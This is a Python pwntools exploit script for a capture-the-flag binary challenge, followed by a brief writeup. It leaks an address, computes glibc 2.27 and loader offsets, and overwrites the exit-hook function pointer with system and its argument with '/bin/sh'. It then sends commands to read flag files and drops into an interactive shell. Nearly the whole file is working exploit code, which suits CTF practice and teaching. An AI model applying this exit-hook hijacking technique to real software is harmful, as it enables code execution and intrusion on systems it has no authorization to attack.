#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

if len(sys.argv) == 1:
    r = process("./chal")

elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

sla(b"Size",b"1145141919")
ru(b"Magic:")
ooo = int(r.recvline().replace(b'\n',b''),16)
print(hex(ooo))
if args.GDB:
    gdb.attach(r)
libc = ooo + 0x44418000 - 0x10
system = libc + 0x4f420
ld = libc + 0x3f1000 # different from local run
rtld = ld + 0x22a060
func_ptr = rtld + 0xf00
argv1 = rtld + 0x908
def calc_off(aaa):
    return hex(((aaa - ooo + 2 ** 64)%2**64) // 8)[2:]
sla(b":",f"{calc_off(func_ptr)} {hex(system)[2:]}")
sla(b":",f"{calc_off(argv1)} 68732f6e69622f")
sl(b"cat ./share/flag")
sl(b"cat /home/chal/flag")
print("found flag!!!")
ru(b"{")
print(ru(b"}"))
leak("libc",hex(libc))
leak("rtld",hex(rtld))
leak("system",hex(system))
r.interactive()

'''
Writeup:
Glibc 2.27
First allocate a big chunk to not use the ptmalloc (mmap region)
The allocated region is above libc. We can modify any 8 bytes twice. There's no malloc/free after modify.
So we can abuse exit hook 
Reference: https://meteorpursuer.github.io/2021/01/21/%E6%B5%85%E8%B0%88exit%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E4%B9%8B%E4%B8%80exit%20hook/
'''
